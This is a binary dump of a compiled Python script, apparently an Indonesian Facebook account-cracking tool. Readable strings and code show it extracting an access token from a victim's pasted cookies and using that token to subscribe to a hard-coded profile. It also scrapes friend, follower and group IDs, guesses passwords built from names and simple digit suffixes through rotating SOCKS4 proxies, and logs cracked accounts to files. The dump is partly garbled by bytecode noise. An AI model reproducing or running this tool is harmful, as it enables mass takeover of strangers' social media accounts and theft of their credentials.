o
    \0cT�  �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
mZ d d	lm Z! d d
l"m#Z$ d dl
mZ% d dl
m&Z& d dl'm(Z) zd dl
Z
W n e*y�   eed�� e�+d� Y nw zd dl,Z,W n e*y�   eed�� e�+d� Y nw zd dl Z W n e*y�   eed�� e�+d� Y nw e&�-�  e� Z.g Z/g Z0g Z1e �2� Z3g Z4ze �5d�j6Z7e8dd��9e7� W n e:�y	 Z; z
ed� W Y dZ;[;ndZ;[;ww e8dd��<� �=� Z7e>d�D ]�Z?dZ@e�Add�ZBe�Add�ZCdZDe�Add�Z;dZEe�Add�ZFe�Add �ZGe�Add �ZHe�Add �ZId!ZJe@� eB� d"eC� d#eD� e;� eE� eF� d"eG� d"eH� d"eI� d#eJ� �ZKe/�LeK� d$ZMe�Ng d%��ZBd&ZCe�Ng d'��ZDe�Add(�Z;e�Ng d'��ZEd)ZFe�Ad*d�ZGd+ZHe�Ad,d-�ZIe�Ad.d/�ZJd0ZOeM� d#eB� d1eC� eD� e;� eE� d2eF� eG� d"eH� d"eI� d"eJ� d#eO� �ZPe0�LeP� �qe>d3�D ]`ZQd4Z@e�Add�ZBe�Add�ZCe�Ng d'��ZDe�Ng d'��Z;e�Ng d'��ZEe�Ng d'��ZFe�Add�ZGd5ZHe�Add�ZIe�Add�ZJd6ZOe@� eB� d7eC� eD� e;� eE� eF� eG� eH� eI� d"eJ� d#eO� �ZR�q�d8d9� ZKg g d d d g g g g g g g g f\ZSZTaUaVaWZXZYZZZ[Z\Z]Z^Z_g Z1g g Z`Zad:Zbd;Zcd<Zdd=Zed>Zfd?Zgd@ZhdAZidBZjdCZkdDZQd;ZldEZJd<ZGdFZmdGZndHZod@ZBdIZpe�NeleJeGeneBg�ZqdJdKdLdMdNdOdPdQdRdSdTdUdV�ZrdJdKdLdMdNdOdPdQdRdSdTdWdX�Zsej�t� juZverewej�t� jx� Zyej�t� jzZ{dYewev� dZ ewey� dZ ewe{� d[ Z|d\ewev� dZ ewey� dZ ewe{� d[ Z}d]d^� Z~d_d`� Zdadb� Z�dcdd� Z�dedf� Z�dgdh� Z�didj� Z�dkdl� Z�dmdn� Z�dodp� Z�dqdr� Z�dsdt� Z�eBdu eG dv eB dw Z�dxdy� Z�dzd{� Z�d|d}� Z�d~d� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�e�d�k�r�ze�+d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze��d�� W n   Y ze�+d�� W n   Y ze�+d�� W n   Y ze�+d`� W n   Y e~d�eQ� d�eG� d�eQ� d�eG� d�eQ� d�eG� d�eQ� d�eG� d�eQ� d�eG� d�eQ� �� e��d�� e��  dS dS )��    N)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textu&   	• Sedang Menginstall Modul Rich •zpip install richu+   	• Sedang Menginstall Modul Stdiomask •zpip install stdiomasku*   	• Sedang Menginstall Modul Requests •z.pip install requests && pip install mechanize zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wu+   [[[1;92m•[1;97m] [[1;96mwhoami-xd-king�ri'  z!Mozilla/5.0 (Symbian/3; Series60/�   �	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9�10�11�12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/c                  C   s�   zt dd��� �� } | D ]}t�|� qW d S    t�d�j}t dd�} t�	dt
|��}|D ]	}| �|d � q/t dd��� �� } Y d S )Nzua2.txtr   z;https://github.com/WHOAMI-XD-KING/Am-Back/blob/main/ua2.txtz.ua2.txtr   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findall�str�write)�uaZub�a�aaZun� rL   �"/sdcard/Download/Fear.py/Hacker.py�uakuZ   s   �
rN   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)�1�2�3�4�5r   r   r   r   r   r   r   ZDevember)�01�02Z03�04Z05Z06Z07Z08Z09r   r   r   zOK-�-z.txtzCP-c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr<   g�������?)�sys�stdoutrH   �flush�time�sleep)�u�erL   rL   rM   �	alvino_xy�   s   2r_   c                   C   s   t �d� d S )N�clear)�os�systemrL   rL   rL   rM   r`   �   s   r`   c                   C   s
   t �  d S )N)�loginrL   rL   rL   rM   �back�   s   
rd   c                   C   sF   t dt� dt� dt� dt� dt� dt� t� dt� dt� dt� �� d S )N�	u4  
 ⠀                     ⣀⣀⣤⣤⣶⣶⣶⣶⣦⣴⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣬⢿⣿⣿⣿⣿⣿⣿⡙⢿⣿⣿⣿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣷⡍⠻⢷⠿⢿⠿⢧⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣆⣰⣶⣆⣀⣾⣿⣿⣿⣿⣿⣿⣿⡿⠿⣥⣾⣿⡀⠀⠀⠀⠀
⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠘⠻⣿⣿⣿⣦⡀⠀⠀
⠀⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣏⣡⣼⣿⣦⣄⠘⢿⣿⣿⣿⣿⡄⠀
⠀⣬⣿⣃⢨⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⡷⠀
⠀⠹⣿⣽⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⡿⠛⠉⠉⠙⢿⣿⣿⣿⠁⠀
⠀⠀⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣽⣿⣿⣿⣇⠀⠀⠀⠀⢸⣿⣿⣿⠂⠀
⠀⠀⢹⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⣿⣿⣿⣿⣿⣿⣿⣶⠦⠀⣼⣿⣿⣿⣀⡀
⠀⢰⣧⣼⣿⣿⣿⠃⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⣆⢸⣿⣿⣿⣿⣿⠿⣷⣶⣶⡄⠈⣿⣿⣿⣸⣿
⠀⠘⣿⣿⡞⣿⡏⠀⠚⠛⠉⠙⣧⡀⠀⠀⠈⣦⣻⣾⣿⣿⣻⣿⢏⡴⠋⠁⠀⠀⠀⣿⣿⣿⣿⡿
⠀⠀⠙⢠⣷⢿⣧⠀⠀⢲⣿⣶⣿⣿⣦⡀⢀⣾⣿⣿⣿⣯⣟⣷⣯⣷⣶⣶⣾⣿⣦⣿⡏⣿⡔⠁
⠀⠀⢠⡼⣧⠘⡏⠀⠀⠀⠁⢹⣂⣤⣼⡿⢻⡟⠻⣿⣿⣿⣿⣹⠯⠖⣁⣿⣿⣿⠛⢻⢃⣿⠷⠀
⠀⠀⠀⢣⡨⠿⠉⠀⠀⠀⠀⣀⣈⠉⠁⠀⠀⠀⠀⢿⡃⢸⣿⣿⣿⣿⣿⣿⠋⠉⠀⠈⠾⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡿⠷⠖⠀⠀⠀⠀⢻⣿⣿⣿⣭⣿⣻⣿⣿⣶⡤⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣯⣇⠀⠀⠀⠀⣀⠀⠀⢸⣿⠇⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠘⣿⣿⣶⣦⣄⣉⠳⠤⣿⣾⣿⣿⣿⠿⣿⡿⢫⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠸⣿⡄⠈⠙⠛⠟⢿⠿⠏⠛⠉⠀⢠⣿⠁⡾⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⠀⠀⠹⣿⡓⠲⠤⠀⠀⢀⡤⠴⠞⣻⣿⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠢⠀⠀⠹⣷⣄⡀⡀⣀⢠⢠⣶⣷⡿⠃⠀⢀⢰⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠈⢆⠀⠈⢿⣿⣶⣾⣿⣿⣿⡿⠀⠀⢀⡏⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠘⣆⠀⢀⡈⣻⣿⣿⣿⣷⣦⡀⠀⣾⠇⣼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠘⣆⠀⠙⠛⠛⣻⠿⣿⣿⠇⣼⡟⣲⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠘⢦⣀⣀⣴⣧⣴⣿⣟⣼⣿⡷⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⣈⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣟⡛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠁⠀⠀⠀⠀⠀⠀
�   •z Author : WHOAMI-XD )r   �asu�m�k�h�sir�xrL   rL   rL   rM   �banner�   s&   
���������rm   c                  C   s�   zgt dd��� } t dd��� }t�| � z&tjdtd  d|id�}t�|j�d }t�|j�d	 }t	||� W W d S  t
yH   t�  Y W d S  tjjyg   d
}t|dd�}t� j|dd� t�  Y W d S w  tyt   t�  Y d S w )N�
.token.txtr   �.cok.txtz:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookies�name�idz2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN�red�ZstyleZcyan)r=   r>   �tokenkurA   rB   rC   �json�loadsrD   �menu�KeyError�login_lagi334�
exceptions�ConnectionError�mark�solr   �exit�IOError)�token�cokZsyZsy2Zsy3�li�lorL   rL   rM   rc   �   s(   
��rc   c                  C   sD  zvt �d� t�  ttd�� t�ttt	t
tg�} tdt	� dt� d| � d��}tjddd	d
ddddddd�	d|id�}t�d|j�}tdd��|�d��}t�  tdd��|�}tdt� dt	� dt� dt	� dt� d�� t�d� t�  W d S  ty� } zt �d� t �d� tdtttttf � t�  W Y d }~d S d }~ww ) Nr`   u:   	©©© Saran Ektensi : [green]Paste-Cookies[white] ©©©z  [rf   z] Masukkan Cookies :r   z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrO   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	�
user-agent�referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-typerp   )�headersrr   z	(EAAG\w+)rn   r   r   ro   z  �[�]z5 LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!zrm -f .token.txtzrm -f .cok.txtz6  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s)ra   rb   rm   �cetak�nel�random�choicerh   ri   rj   �br]   �inputrl   rB   rC   rE   �searchrD   r=   rH   �group�botr   r[   r\   r�   �	Exception)rg   rp   �dataZ
find_tokenZkenr�   r^   rL   rL   rM   r|   �   s&   
(2

��r|   c                   C   s"   z
t �dt � W d S    Y d S )NzMhttps://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s)rB   �postrw   rL   rL   rL   rM   r�   �   s   r�   c                 C   s�  zt dd��� }t dd��� }W n ty%   td� t�d� t�  Y nw t�d� t	�  t
�d�j}d}ttd	|  �� td
t|� � td|� �� td|� �� td� td� td� td� td� td� td� td�}|dv r}t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�d� t�d� td� t�  d S td� t�  d S )Nrn   r   ro   u   [×] Cookies Kadaluarsa �   r`   zhttps://api.ipify.orgz!github.com/WHOAMI-XD-KING/Am-Backz"	Selamat Datang [yellow]%s[white] z>> Your Idz : z>> Your Ip  : z>> Github   : � z>> 1. Crack Publik z>> 2. Crack Follower z>> 3. Crack Grup   z>> 4. Crack File	z>> 5. Hasil Crack  z>> 0. Keluar       �
>> Pilih : �rO   �rP   �rQ   )rR   )rS   )r7   zrm -rf .token.txtzrm -rf .cookie.txtz>> Sukses Logout+Hapus Kukis �>> Pilih Yang Bener )r=   r>   r�   r   r[   r\   r|   ra   rb   rm   rB   rC   rD   r�   r�   rG   r�   �dump_massalZdump_follower�grup�
crack_file�resultr�   rd   )Zmy_nameZmy_idr�   r�   ZipZghZwhoamirL   rL   rM   rz   �   sR   

�









rz   c                   C   s&   t t� dt� �� t�d� t�  d S )Nz$>> Maaf Fitur Ini Masih Di Perbaiki r   )r   ri   rl   r[   r\   rd   rL   rL   rL   rM   �error  s   

r�   c                  C   s�  t dt� dt� d�� t dt� dt� d�� t d� td�} | dv �r>zt�d�}W n ty?   t d	� t�	d
� t
�  Y nw t|�dkrTt d� t�	d� t
�  d S d}i }|D ]k}ztd| d��� }W n   Y qZ|d7 }|dk r�dt|� }|�t|�t|�i� |�|t|�i� t dt� dt� d�||t|�f � qZ|�t|�t|�i� t dt|� d | d tt|�� d t � qZtd�}z|| }W n ty�   t d� t
�  Y nw ztd| d��� �� }	W n   t d	� t�	d� t
�  Y d}
tt|	��D ] }|	|
 �d�}t t� dt� |d � d|d � �� |
d7 }
�qt d� tt� dt� dt� d�� t
�  d S | dv �rhzt�d�}W n t�y`   t d	� t�	d� t
�  Y nw t|�dk�rvt d � t�	d� t
�  d S d}i }|D ]i}ztd!| d��� }W n   Y �q||d7 }|dk �r�d"t|� }|�t|�t|�i� |�|t|�i� t d#t� d$t� d%�||t|�f � �q||�t|�t|�i� t dt� dt� d�||t|�f � �q|td&�}z|| }W n t�y   t d� t
�  Y nw ztd!| d��� �� }	W n   t d	� t�	d� t
�  Y d}
tt|	��D ])}|	|
 �d�}t d� t t� dt� |d � d|d � d|d � �� |
d7 }
�q(t d� tt� dt� dt� d�� t
�  d S | d'v �rrt
�  d S t d� t
�  d S )(Nz>> 1. Hasil �OKz Anda z>> 2. Hasil �CPz>> 3. Kembali	r�   r�   z>> File Tidak Di Temukan �   r   z >> Anda Tidak Memiliki Hasil CP �   �CP/r   r   r:   r�   �>> %s. %s (� %s zIdz )r�   �] � [ �
 Account ]r�   �|z>> z Klik Enterz ]r�   z >> Anda Tidak Mempunyai File OK �OK/r7   z>> %s. %s ( �%sz Idz )z	
Pilih : r�   )r   rj   rl   ri   r�   ra   �listdir�FileNotFoundErrorr[   r\   rd   �lenr=   �	readlinesrG   �updater{   r>   r?   �range�splitrh   )Zkz�vin�cih�lol�isi�hem�nom�geeh�geh�linZnocpZcpkuZcpkunirL   rL   rM   r�   
  s�   


�


&2
�
$



�


((
�
.



r�   c               
   C   s  zt dd��� } t dd��� }W n ty   t�  Y nw zttd��}W n ty5   td� t�  Y nw |dk s>|dkrEtd� t�  t�	� }d	}t
|�D ]}|d7 }td
t|� d �}t�|� qOtD ]W}z9|jd| d td	  d|id��� }|d d D ]}	z|	d d |	d  }
|
tv r�nt�|
� W q�   Y q�W qg ttfy�   Y qg tjjy�   td� t�  Y qgw ztd� tdt� �ttt�� � t�  W d S  tjjy�   tt� � td� t�  Y d S  ttf�y   tdt� dt� �� t�d� t�  Y d S w )Nrn   r   ro   z>> Mau Berapa Target ? : z>> Masukkan Angka Jangan Huruf r   r   z>> Gagal Dump Idz r   z>> Masukkan Idz Yang Ke z : z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=rr   rq   Zfriendsr�   rt   r�   rs   z>> Tidak Ada Sinyal Loh r�   u   >> Total Idz Yang Terkumpul🔎�>> Tidak Ada Sinyal �>>z Pertemanan Tidak Publik r�   )r=   r>   r�   r�   �intr�   �
ValueErrorr   rB   �Sessionr�   rG   �uidrA   rC   rw   rx   rt   r{   r}   r~   rj   r�   �settingrl   rd   ri   r[   r\   )r�   r�   Zjum�sesZyzZmetZklZuserr�col�miZisorL   rL   rM   r�   l  sf   
�
�&

�
�
�

�r�   c               	   C   s  zt dd��� } t dd��� }W n ty   t�  Y nw td� td�}zDtjd| d td  d	|id
��	� }|d d D ]}zt
�|d d |d  � W q?   Y q?tdt� d�ttt
�� � t�  W d S  tjjy|   td� t�  Y d S  ttfy�   td� t�  Y d S w )Nrn   r   ro   z2>> Ketik ( me ) Jika Ingin Crack Follower Sendiri z>> Masukkan Idz Target : zhttps://graph.facebook.com/z.?fields=subscribers.limit(99999)&access_token=r   rp   rq   Zsubscribersr�   rt   r�   rs   z>> Total Idz :r   z>> Koneksi Internet Bermasalah z>> Gagal Mengambil Target )r=   r>   r�   r�   r   r�   rB   rC   rw   rx   rt   rA   rj   rG   r�   r�   r}   r~   r{   )r�   r�   ZpilZkoh2�pirL   rL   rM   �dump_pengikut�  s,   
�& 
�r�   r�   u   ✓r�   c                   C   sL   t dt� dt� d�tt� � tt� dt� dt� d�� t d� 	 t�  d S )Nr<   z>> Total Idz Yang Terkumpul :r�   z>> [ zKlik Enter r�   r�   )r   rl   rj   r�   rt   r�   rh   r�   rL   rL   rL   rM   �lah�  s
   
r�   c                  C   s�  t d� tt� d��} d}d|i}d|  }t�� }zt|j||d�jd�}W n tjj	y=   t d� t
�d	� t�  Y nw |�d
�}|j�dd��dd�}|dkr_t d� t
�d	� t�  n|dkrptd� t
�d	� t�  n	 t t� dt� d�| � |�d�}g }	|D ]}
|
j}|�dd�}zt|�}|	�|�}W q�   Y q�t|	�dkr�t d� nt t� dt� d�|	d  � t|� d S )Nr�   z%>> Masukkan Username Atau Idz Grup : ��Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gbar�   z#https://mbasic.facebook.com/groups/�r�   �html.parserr�   g      �?�title� | Facebook� Grup Publik�Masuk Facebookz5 Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..Z	Kesalahanz>> Grup Tidak Di Temukan z>> Nama Grup : r�   �tableZAnggotar   z Anggota : -z>> Anggota : )r   r�   rl   rB   r�   �parserrC   rD   r}   r~   r[   r\   r�   �find�replacer�   r_   r�   �find_allr�   rA   r�   rj   �grup1)rt   rI   �miskinlu�urlr�   ZgnZberrZberr2ZggsZangZffZanggoZbroZmexZjumlahrL   rL   rM   r�   �  sN   

�




r�   c                 C   s�  g }t �� }tt� d�� tdt� dt� dt� dt� d�	� 	 �z#d}d	|i}z|d
 }W n   | }Y t|j||d�jd�}|�	d�}|D ]$}t
|��d�}	d|	v rjt
|��dd��dd�}
|
�d�d
 �dd�}qF|�	d�}|D ]�}|j}|�d�}d|v r�t�dt
|��}|d
 �dd�}|�dd�}|d | }|tv r�qrt�|� tdt t d t d t
tt�� t d dd� tj��  qrd|v �rt�dt
|��}|d
 �dd�}|�d �d
 }|d | }|tv r�qrt�|� t�ttttttg�}td!t� d"|� d#t� d$�tt� dd� tj��  qrqrz|}|�d
d%| � W n   |�d&�}|j�d'd��d(d�}|d)k�r>nt�  Y W n- t jj�yd   zt �!d*� W n t"�ya   t�  Y nw Y n t"�yp   t�  Y nw q)+Nz>> Sedang Mengumpulkan Idz z>> Klik zCtrl+Cz Untuk ZStopz Dump !!Tr�   r�   r   r�   r�   rJ   �>zLihat Postingan Lainnya</spanz	<a href="r�   zamp;r   z"><imgr�   Z
mengajukanzcontent_owner_id_new.\w+zcontent_owner_id_new.z mengajukan pertanyaan .r�   �z { zProses Mengambil ID z }��endz > u   	———>> �(r�   u   ) <<———�https://mbasic.facebook.comr�   r�   r�   r�   �   )#rB   r�   r   rl   ri   rh   r�   rC   rD   r�   rG   r�   r�   rE   rF   rt   rA   �balmondrj   r�   rX   rY   rZ   r�   r�   r]   r�   �insertr�   r�   r}   r~   r[   r\   �KeyboardInterrupt)ZurlsZuser�   rI   r�   r�   �setZbf2�gZcssZbcjZbcj2ZtesZcariZliatnihZsplZidsiapaZidyouZnamayouZidkuZxyZlink_ZgirangZgirang2rL   rL   rM   r�   �  s�   "
�


@

4

�
��
��r�   c                  C   s�  zt �d�} W n ty   td� t�d� t�  Y nw t| �dkrwtd� tt	d�� t
d�}|dv r:td	� n/|d
v rRtdt� dt� d�� t�d� t�  n|dv ritdt� dt� d�� t�d� t�  td� t�d� t�  d S d}i }| D ]v}ztd| d��� }W n   Y q}|d7 }|dk r�dt|� }|�t|�t|�i� |�|t|�i� tdt� dt� d�||t|�f � q}|�t|�t|�i� tdt|� d | d tt|�� d t � td||t|�f � q}t
d�}z|| }W n t�y   tt� d t� �� t�d� t�  Y nw ztd!| d��� �� }	W n   td"� t�d� t�  Y |	D ]}
t�|
� �q:t�  d S )#Nz/sdcard/ILMAN-DUMPz>> File Tidak Ditemukan r�   r   r�   uc  [white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini
[[green]1[white]] Buatlah File Dump Id Terlebih dahulu
[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ILMAN-DUMP[white] di Penyimpanan Internal Kalian
[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini z
>> Apakah Anda Faham ( Y/t ) �r�   r�   ��yr4   z
[u   √z%] Alhamdulillah Anda Sungguh Pintarr r�   )�tr/   rl   z] Anda Sungguh Tolol z!>> Anda Tidak Memiliki File Dump z/sdcard/ILMAN-DUMP/r   r   r   r�   z %sz idz )r�   r�   r�   r�   z>> %s. %s ({h} %s {x}idz) r�   z>> Pilih Yang Bener Kontol z/sdcard/WHOAMI-DUMP/z)>> File Tidak Ditemukan, Coba Lagi Nanti )ra   r�   r�   r   r[   r\   rd   r�   r�   r�   r�   rj   rl   ri   r�   r=   r�   rG   r�   r{   r>   r?   rt   rA   r�   )r�   Zkontolr�   r�   r�   r�   r�   r�   r�   r�   ZxidrL   rL   rM   r�   "  sh   

�





&0

�

r�   c                  C   s�  t t� d�� t d� t d� td�} | dv r$tt�D ]}t�|� qn4| dv rQg }tt�D ]}|�|� q.t|�}|d }t|�D ]}t�|| � |d8 }qBnt d� t	�  t d	� t d� td�}|dv rnt
�d
� n|dv rzt d� t�  n|dv r�t
�d� nt
�d
� t d� td�}|dv r�t d� t�  n|dv r�t�d� nt�d� td�}	|	dv r�t�d� ttd�� td�}
|
�d�}|D ]}t�|� q�nt�d� t�  d S )Nz>> 1. Akun Old z>> 2. Akun New r�   �>> Pilih : )rO   rT   )rP   rU   r   r�   z>> 1. Mobile �mobiler�   )rR   rV   �mbasicz>> Tambahkan Aplikasi ( Y/t ) r�   �ya�noz%>> Tambahkan Password Manual ( Y/t ) u   [[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter
[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] z >> Masukkan Password Tambahan : �,)r   rl   r�   �sortedrt   �id2rA   r�   r�   r�   �methodr�   rd   �	taplikasi�pwplussr�   r�   r�   �pwnya�passwrd)�huZtuaZmudaZbacotZbcmZbcmiZxmudZhcZ_jembot_ZpwplusZpwkuZpwkuhZxpwrL   rL   rM   r�   X  sd   �
�



�

r�   c                  C   s�  t dt� dt� dt� dt� dt� dt� dt� dt� d�� t d� t dt� dt� dt� d	t� �t � t dt� d
t� dt� dt� �t � t dt� dt� d�� tdd���} tD ]�}|�	d�d |�	d�d �
� }}|�	d�d }g }t|�dk r�t|�dk r�n<|�|d � |�|d � |�|d � n&t|�dk r�|�|� n|�|� |�|d � |�|d � |�|d � dtv r�tD ]}|�|� q�n	 dtv r�| �t||� qXdtv r�| �t||� qXdtv r�| �t||� qXdtv r�| �t||� qX| �t||� qXW d   � n	1 �sw   Y  t d� ttd�� t d t� dt� d!t� d"t� d#�	t � t t� d t� dt� d!t� d$t� d%t� d�t � t d� t d&� td'�}|d(v �r`t�  d S t d)t� d*t� d+t� d,�� t�d-� t�  d S ).Nz>>>>> rf   z2 Sedang Memulai Crack Mohon Tunggu Sampai Selesai z <<<<< r�   z	>> Hasil r�   z Tersimpan Di : zOK/%s r�   zCP/%s z>> Mainkan Mode Pesawat Setiap Z1kz Idz
�   )�max_workersr�   r   r   r   �   r�   Z123Z1234Z12345r�   r�   Zfree�touchr�   uM   	[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] r�   r�   z OK : z%s z CP : r�   z">> Lanjut Crack Kembali ( Y/t ) ? r�   r�   re   r�   z Good Bye Dadaahhz << r�   )r   rh   ri   rj   rl   �okc�cpc�tredr�   r�   �lowerr�   rA   r   r  r�   �submit�crack�	crackfree�
cracktouch�crackmbasicr�   r�   r�   �ok�cpr�   rd   r[   r\   r�   )ZpoolZyuzong�idfZnmfZfrs�pwvZxpwdZwoirL   rL   rM   r  �  sd   :$$"
���"&0



r  c                  C   s  t �ttttttg�}tj	�
dt� dt� t� t� dt� tt�� t� dt� dt� t� t� dt� dt� t� t� d|� d�tttt�� �� t� d��f tj	��  t �t�}t �t�}t�� }|D �]}�zt �t�}dd	| i}|j�d
ddd|dddddd�
� |�d|  d �}	t�dt|	j ���!d�t�dt|	j ���!d�| dd|d�}
d�"dd� |	j#�$� �%� D ��}|d7 }i d d
�d!d�d"d#�d$d�d%d&�d'd�d(d)�d*d+�d,|�d-d�d.d/�d0d�d1d�d2d�d3d|  d �d4d5�d6d�}|j&d7|
d8|i|d9|d:�}d;|j#�$� �'� v �rAt(d<t� d=t� d>| � d?|� t)� �	� t*d@t+ dA��
| d? | dB � t,�-dC� t.�/| d? | � td7 aW  �n?dD|j#�$� �'� v �rkd,dEi}dFt0v �r�td7 a|j#�$� }d�"dGd� |j#�$� �%� D ��}t(d<t� dHt� | � d?|� d?|� t)� �
� t*dIt1 dA��
| d? | d? | dB � t,�-dJ� W  n�dKt0v �rj|j#�$� }d�"dLd� |j#�$� �%� D ��}t*dIt1 dA��
| d? | d? | dB � | }dM}t�� }|jdN||dO�j }|jdP||dO�j }t�2dQt|��}d}|D ]$}|dRt� dt� |� t� dSt� |dT � d>|d � t� dB�7 }|d7 }�q�dT}t�2dQt|��}dT}|D ]$}|d7 }|dRt� dt� |� t� dSt� |dT � d>|d � t� dB�7 }�q"t(d<t� dHt� | � d?|� d?|� dB|� t� �� t,�-dJ� td7 aW  nnW q_W q_ tj3j4�y   t5�6d� Y q_w td7 ad S )UNu   🔎 r�   r;   �   ]—�   ]—[�{:.0%}�]  �httpz	socks4://zm.facebook.comr�   �?1rO   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�same-origin�cors�emptyr�   �
